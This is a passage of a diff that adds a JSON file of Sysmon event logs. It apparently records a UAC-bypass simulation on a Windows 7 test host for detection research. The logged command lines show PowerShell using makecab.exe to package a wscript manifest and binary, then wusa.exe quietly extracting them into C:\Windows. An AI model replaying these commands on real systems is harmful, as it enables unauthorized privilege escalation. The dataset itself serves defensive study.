@@ -1,0 +1,1698 @@
+[
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "11"
+                },
+                "Version": "2",
+                "Level": "4",
+                "Task": "11",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:18.765888+00:00"
+                },
+                "EventRecordID": "11219",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:18.765"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "TargetFilename",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\wscript.exe.manifest"
+                    },
+                    {
+                        "@Name": "CreationUtcTime",
+                        "#text": "2019-05-09 02:52:18.765"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:18.844011+00:00"
+                },
+                "EventRecordID": "11220",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:18.812"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e2-5cd3-0000-001097410f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "1292"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\makecab.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Microsoft\u00ae Cabinet Maker"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\makecab.exe\" C:\\Users\\IEUser\\AppData\\Local\\Temp\\wscript.exe.manifest C:\\Users\\IEUser\\AppData\\Local\\Temp\\uf3huvkczgk.tmp"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:18.922136+00:00"
+                },
+                "EventRecordID": "11222",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:18.859"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e2-5cd3-0000-0010c6440f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3636"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\uf3huvkczgk.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:18.953388+00:00"
+                },
+                "EventRecordID": "11224",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:18.906"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e2-5cd3-0000-001083470f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3620"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\" \"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\uf3huvkczgk.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:18.969011+00:00"
+                },
+                "EventRecordID": "11226",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:18.922"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e2-5cd3-0000-001074490f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2420"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\uf3huvkczgk.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:19.250261+00:00"
+                },
+                "EventRecordID": "11228",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:19.172"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e3-5cd3-0000-00100c650f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3536"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\uf3huvkczgk.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Windows\\system32\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020a43a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013aa4"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "High"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:21.250261+00:00"
+                },
+                "EventRecordID": "11229",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:21.234"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e5-5cd3-0000-00101f720f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3828"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\makecab.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Microsoft\u00ae Cabinet Maker"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\System32\\makecab.exe\" C:\\Windows\\System32\\wscript.exe C:\\Users\\IEUser\\AppData\\Local\\Temp\\oz5ctxorxp4.tmp"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=EC611A8F412E231C52652C7612A9CE7E3FB40DB0,MD5=CEA119C323082026583901452B14C30E,SHA256=0AA12426F5254E84562D4FA60DDBB570A9A1B14056FB0B932C19232FD94FF441,IMPHASH=FEA77D23CF603C3FC78D329043294CF5"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:21.265888+00:00"
+                },
+                "EventRecordID": "11231",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:21.234"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e5-5cd3-0000-00108f720f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "3824"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\oz5ctxorxp4.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
+                    "@Name": "Microsoft-Windows-Sysmon",
+                    "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+                },
+                "EventID": {
+                    "@Qualifiers": "",
+                    "#text": "1"
+                },
+                "Version": "5",
+                "Level": "4",
+                "Task": "1",
+                "Opcode": "0",
+                "Keywords": "0x8000000000000000",
+                "TimeCreated": {
+                    "@SystemTime": "2019-05-09 02:52:21.281513+00:00"
+                },
+                "EventRecordID": "11233",
+                "Correlation": {
+                    "@ActivityID": "",
+                    "@RelatedActivityID": ""
+                },
+                "Execution": {
+                    "@ProcessID": "1988",
+                    "@ThreadID": "228"
+                },
+                "Channel": "Microsoft-Windows-Sysmon/Operational",
+                "Computer": "IEWIN7",
+                "Security": {
+                    "@UserID": "S-1-5-18"
+                }
+            },
+            "EventData": {
+                "Data": [
+                    {
+                        "@Name": "RuleName"
+                    },
+                    {
+                        "@Name": "UtcTime",
+                        "#text": "2019-05-09 02:52:21.234"
+                    },
+                    {
+                        "@Name": "ProcessGuid",
+                        "#text": "{365abb72-95e5-5cd3-0000-001065730f00}"
+                    },
+                    {
+                        "@Name": "ProcessId",
+                        "#text": "2852"
+                    },
+                    {
+                        "@Name": "Image",
+                        "#text": "C:\\Windows\\System32\\wusa.exe"
+                    },
+                    {
+                        "@Name": "FileVersion",
+                        "#text": "6.1.7600.16385 (win7_rtm.090713-1255)"
+                    },
+                    {
+                        "@Name": "Description",
+                        "#text": "Windows Update Standalone Installer"
+                    },
+                    {
+                        "@Name": "Product",
+                        "#text": "Microsoft\u00ae Windows\u00ae Operating System"
+                    },
+                    {
+                        "@Name": "Company",
+                        "#text": "Microsoft Corporation"
+                    },
+                    {
+                        "@Name": "CommandLine",
+                        "#text": "\"C:\\Windows\\system32\\wusa.exe\" \"C:\\Windows\\system32\\wusa.exe\"  C:\\Users\\IEUser\\AppData\\Local\\Temp\\oz5ctxorxp4.tmp /extract:C:\\Windows /quiet"
+                    },
+                    {
+                        "@Name": "CurrentDirectory",
+                        "#text": "C:\\Users\\IEUser\\AppData\\Local\\Temp\\onedrive\\"
+                    },
+                    {
+                        "@Name": "User",
+                        "#text": "IEWIN7\\IEUser"
+                    },
+                    {
+                        "@Name": "LogonGuid",
+                        "#text": "{365abb72-94cd-5cd3-0000-0020dd3a0100}"
+                    },
+                    {
+                        "@Name": "LogonId",
+                        "#text": "0x0000000000013add"
+                    },
+                    {
+                        "@Name": "TerminalSessionId",
+                        "#text": "1"
+                    },
+                    {
+                        "@Name": "IntegrityLevel",
+                        "#text": "Medium"
+                    },
+                    {
+                        "@Name": "Hashes",
+                        "#text": "SHA1=B94D16ED6A439CFE591E7A20627F3033E71A10E2,MD5=8CBD6FDACDCC0ED48BAF607226D6D0C9,SHA256=CB128FAF0430CE1A90412546E90A3B6446C74887D696485CC2C3AAF10714A428,IMPHASH=DDC91ECD17D943E2EE26D62FC9A4FB0C"
+                    },
+                    {
+                        "@Name": "ParentProcessGuid",
+                        "#text": "{365abb72-9570-5cd3-0000-00103fc90a00}"
+                    },
+                    {
+                        "@Name": "ParentProcessId",
+                        "#text": "1900"
+                    },
+                    {
+                        "@Name": "ParentImage",
+                        "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                    },
+                    {
+                        "@Name": "ParentCommandLine",
+                        "#text": "powershell"
+                    }
+                ]
+            }
+        }
+    },
+    {
+        "Event": {
+            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+            "System": {
+                "Provider": {
